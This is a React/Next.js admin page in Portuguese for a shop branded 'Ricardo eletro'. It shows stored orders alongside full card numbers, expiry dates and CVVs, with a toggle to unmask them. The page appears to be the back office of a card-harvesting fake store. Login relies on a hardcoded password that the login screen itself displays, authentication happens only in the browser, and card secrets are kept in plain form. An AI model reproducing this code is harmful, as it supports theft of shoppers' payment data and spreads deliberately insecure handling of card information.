"use client"

import type React from "react"

import { useState, useEffect } from "react"
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs"
import { Badge } from "@/components/ui/badge"
import { Eye, EyeOff, CreditCard, ShoppingBag, Users, TrendingUp } from "lucide-react"

interface Order {
  id: string
  userId: string
  userName: string
  userEmail: string
  items: any[]
  total: number
  cardData: {
    name: string
    number: string
    expiry: string
    cvv: string
    installments: string
  }
  timestamp: string
  status: string
}

interface User {
  id: string
  name: string
  email: string
  phone?: string
  address?: string
  registeredAt: string
  totalOrders: number
  totalSpent: number
}

export default function AdminPage() {
  const [isAuthenticated, setIsAuthenticated] = useState(false)
  const [adminCredentials, setAdminCredentials] = useState({ username: "", password: "" })
  const [orders, setOrders] = useState<Order[]>([])
  const [users, setUsers] = useState<User[]>([])
  const [showCardDetails, setShowCardDetails] = useState<{ [key: string]: boolean }>({})
  const [stats, setStats] = useState({
    totalOrders: 0,
    totalRevenue: 0,
    totalUsers: 0,
    averageOrderValue: 0,
  })

  // Credenciais do admin (em produção, isso deveria vir de um banco seguro)
  const ADMIN_USERNAME = "admin"
  const ADMIN_PASSWORD = "ricardo123"

  useEffect(() => {
    if (isAuthenticated) {
      loadData()
    }
  }, [isAuthenticated])

  const loadData = () => {
    // Carregar pedidos
    const savedOrders = JSON.parse(localStorage.getItem("orders") || "[]")
    const savedUsers = JSON.parse(localStorage.getItem("users") || "[]")

    setOrders(savedOrders)
    setUsers(savedUsers)

    // Calcular estatísticas
    const totalRevenue = savedOrders.reduce((sum: number, order: Order) => sum + order.total, 0)
    setStats({
      totalOrders: savedOrders.length,
      totalRevenue,
      totalUsers: savedUsers.length,
      averageOrderValue: savedOrders.length > 0 ? totalRevenue / savedOrders.length : 0,
    })
  }

  const handleLogin = (e: React.FormEvent) => {
    e.preventDefault()
    if (adminCredentials.username === ADMIN_USERNAME && adminCredentials.password === ADMIN_PASSWORD) {
      setIsAuthenticated(true)
    } else {
      alert("Credenciais inválidas!")
    }
  }

  const toggleCardVisibility = (orderId: string) => {
    setShowCardDetails((prev) => ({
      ...prev,
      [orderId]: !prev[orderId],
    }))
  }

  const maskCardNumber = (number: string) => {
    if (!number) return ""
    return number.replace(/(\d{4})(\d{4})(\d{4})(\d{4})/, "**** **** **** $4")
  }

  const formatCurrency = (value: number) => {
    return `R$ ${value.toFixed(2).replace(".", ",")}`
  }

  if (!isAuthenticated) {
    return (
      <div className="min-h-screen bg-gray-100 flex items-center justify-center">
        <Card className="w-full max-w-md">
          <CardHeader className="text-center">
            <div className="bg-gradient-to-r from-yellow-400 to-yellow-500 px-8 py-3 rounded-lg inline-block mb-4">
              <span className="text-red-600 font-bold text-xl">Ricardo</span>
              <span className="text-green-700 font-bold text-xl ml-1">eletro</span>
            </div>
            <CardTitle>🔐 Painel Administrativo</CardTitle>
          </CardHeader>
          <CardContent>
            <form onSubmit={handleLogin} className="space-y-4">
              <div>
                <Label htmlFor="username">Usuário</Label>
                <Input
                  id="username"
                  value={adminCredentials.username}
                  onChange={(e) => setAdminCredentials({ ...adminCredentials, username: e.target.value })}
                  required
                />
              </div>
              <div>
                <Label htmlFor="password">Senha</Label>
                <Input
                  id="password"
                  type="password"
                  value={adminCredentials.password}
                  onChange={(e) => setAdminCredentials({ ...adminCredentials, password: e.target.value })}
                  required
                />
              </div>
              <Button type="submit" className="w-full bg-red-500 hover:bg-red-600">
                Entrar
              </Button>
            </form>
            <div className="mt-4 text-sm text-gray-600 text-center">
              <p>Credenciais de teste:</p>
              <p>
                <strong>Usuário:</strong> admin
              </p>
              <p>
                <strong>Senha:</strong> ricardo123
              </p>
            </div>
          </CardContent>
        </Card>
      </div>
    )
  }

  return (
    <div className="min-h-screen bg-gray-100">
      <div className="bg-white shadow-sm border-b">
        <div className="container mx-auto px-4 py-4">
          <div className="flex items-center justify-between">
            <div className="flex items-center space-x-4">
              <div className="bg-gradient-to-r from-yellow-400 to-yellow-500 px-6 py-2 rounded-lg">
                <span className="text-red-600 font-bold">Ricardo</span>
                <span className="text-green-700 font-bold ml-1">eletro</span>
              </div>
              <h1 className="text-2xl font-bold">Painel Administrativo</h1>
            </div>
            <Button onClick={() => setIsAuthenticated(false)} variant="outline">
              Sair
            </Button>
          </div>
        </div>
      </div>

      <div className="container mx-auto px-4 py-8">
        {/* Estatísticas */}
        <div className="grid grid-cols-1 md:grid-cols-4 gap-6 mb-8">
          <Card>
            <CardContent className="p-6">
              <div className="flex items-center space-x-2">
                <ShoppingBag className="h-8 w-8 text-blue-500" />
                <div>
                  <p className="text-sm text-gray-600">Total de Pedidos</p>
                  <p className="text-2xl font-bold">{stats.totalOrders}</p>
                </div>
              </div>
            </CardContent>
          </Card>

          <Card>
            <CardContent className="p-6">
              <div className="flex items-center space-x-2">
                <TrendingUp className="h-8 w-8 text-green-500" />
                <div>
                  <p className="text-sm text-gray-600">Receita Total</p>
                  <p className="text-2xl font-bold">{formatCurrency(stats.totalRevenue)}</p>
                </div>
              </div>
            </CardContent>
          </Card>

          <Card>
            <CardContent className="p-6">
              <div className="flex items-center space-x-2">
                <Users className="h-8 w-8 text-purple-500" />
                <div>
                  <p className="text-sm text-gray-600">Total de Usuários</p>
                  <p className="text-2xl font-bold">{stats.totalUsers}</p>
                </div>
              </div>
            </CardContent>
          </Card>

          <Card>
            <CardContent className="p-6">
              <div className="flex items-center space-x-2">
                <CreditCard className="h-8 w-8 text-orange-500" />
                <div>
                  <p className="text-sm text-gray-600">Ticket Médio</p>
                  <p className="text-2xl font-bold">{formatCurrency(stats.averageOrderValue)}</p>
                </div>
              </div>
            </CardContent>
          </Card>
        </div>

        <Tabs defaultValue="orders" className="space-y-6">
          <TabsList>
            <TabsTrigger value="orders">💳 Pedidos e Cartões</TabsTrigger>
            <TabsTrigger value="users">👥 Usuários</TabsTrigger>
          </TabsList>

          <TabsContent value="orders">
            <Card>
              <CardHeader>
                <CardTitle>💳 Pedidos e Dados dos Cartões</CardTitle>
              </CardHeader>
              <CardContent>
                {orders.length === 0 ? (
                  <p className="text-gray-500 text-center py-8">Nenhum pedido encontrado.</p>
                ) : (
                  <div className="space-y-6">
                    {orders.map((order, index) => (
                      <Card key={index} className="border-l-4 border-l-blue-500">
                        <CardContent className="p-6">
                          <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
                            {/* Informações do Pedido */}
                            <div>
                              <div className="flex items-center justify-between mb-4">
                                <h3 className="font-bold text-lg">Pedido #{index + 1}</h3>
                                <Badge variant="secondary">
                                  {new Date(order.timestamp).toLocaleDateString("pt-BR")}
                                </Badge>
                              </div>

                              <div className="space-y-2 mb-4">
                                <p>
                                  <strong>Cliente:</strong> {order.userName || "N/A"}
                                </p>
                                <p>
                                  <strong>Email:</strong> {order.userEmail || "N/A"}
                                </p>
                                <p>
                                  <strong>Total:</strong>{" "}
                                  <span className="text-green-600 font-bold">{formatCurrency(order.total)}</span>
                                </p>
                              </div>

                              <div>
                                <h4 className="font-semibold mb-2">Itens do Pedido:</h4>
                                <div className="space-y-1">
                                  {order.items.map((item, itemIndex) => (
                                    <div key={itemIndex} className="text-sm bg-gray-50 p-2 rounded">
                                      <span className="font-medium">{item.name}</span>
                                      <span className="text-gray-600"> - Qtd: {item.quantity}</span>
                                      <span className="text-green-600 font-semibold ml-2">
                                        {formatCurrency(item.price * item.quantity)}
                                      </span>
                                    </div>
                                  ))}
                                </div>
                              </div>
                            </div>

                            {/* Dados do Cartão */}
                            <div className="bg-red-50 p-4 rounded-lg">
                              <div className="flex items-center justify-between mb-4">
                                <h4 className="font-semibold text-red-700">🔒 Dados do Cartão</h4>
                                <Button
                                  size="sm"
                                  variant="outline"
                                  onClick={() => toggleCardVisibility(index.toString())}
                                >
                                  {showCardDetails[index.toString()] ? (
                                    <EyeOff className="h-4 w-4" />
                                  ) : (
                                    <Eye className="h-4 w-4" />
                                  )}
                                  {showCardDetails[index.toString()] ? "Ocultar" : "Mostrar"}
                                </Button>
                              </div>

                              <div className="space-y-2 text-sm">
                                <div className="flex justify-between">
                                  <span className="font-medium">Nome:</span>
                                  <span>{order.cardData.name}</span>
                                </div>
                                <div className="flex justify-between">
                                  <span className="font-medium">Número:</span>
                                  <span className="font-mono">
                                    {showCardDetails[index.toString()]
                                      ? order.cardData.number
                                      : maskCardNumber(order.cardData.number)}
                                  </span>
                                </div>
                                <div className="flex justify-between">
                                  <span className="font-medium">Validade:</span>
                                  <span className="font-mono">
                                    {showCardDetails[index.toString()] ? order.cardData.expiry : "**/**"}
                                  </span>
                                </div>
                                <div className="flex justify-between">
                                  <span className="font-medium">CVV:</span>
                                  <span className="font-mono">
                                    {showCardDetails[index.toString()] ? order.cardData.cvv : "***"}
                                  </span>
                                </div>
                                <div className="flex justify-between">
                                  <span className="font-medium">Parcelamento:</span>
                                  <span>{order.cardData.installments}x</span>
                                </div>
                              </div>
                            </div>
                          </div>
                        </CardContent>
                      </Card>
                    ))}
                  </div>
                )}
              </CardContent>
            </Card>
          </TabsContent>

          <TabsContent value="users">
            <Card>
              <CardHeader>
                <CardTitle>👥 Usuários Cadastrados</CardTitle>
              </CardHeader>
              <CardContent>
                {users.length === 0 ? (
                  <p className="text-gray-500 text-center py-8">Nenhum usuário cadastrado.</p>
                ) : (
                  <div className="space-y-4">
                    {users.map((user, index) => (
                      <Card key={index} className="border-l-4 border-l-green-500">
                        <CardContent className="p-4">
                          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                            <div>
                              <h3 className="font-bold">{user.name}</h3>
                              <p className="text-gray-600">{user.email}</p>
                              {user.phone && <p className="text-sm text-gray-500">📞 {user.phone}</p>}
                            </div>
                            <div className="text-right">
                              <p className="text-sm text-gray-500">
                                Cadastrado em: {new Date(user.registeredAt).toLocaleDateString("pt-BR")}
                              </p>
                              <p className="text-sm">
                                <span className="font-semibold">{user.totalOrders}</span> pedidos
                              </p>
                              <p className="text-green-600 font-bold">{formatCurrency(user.totalSpent)} gastos</p>
                            </div>
                          </div>
                        </CardContent>
                      </Card>
                    ))}
                  </div>
                )}
              </CardContent>
            </Card>
          </TabsContent>
        </Tabs>
      </div>
    </div>
  )
}
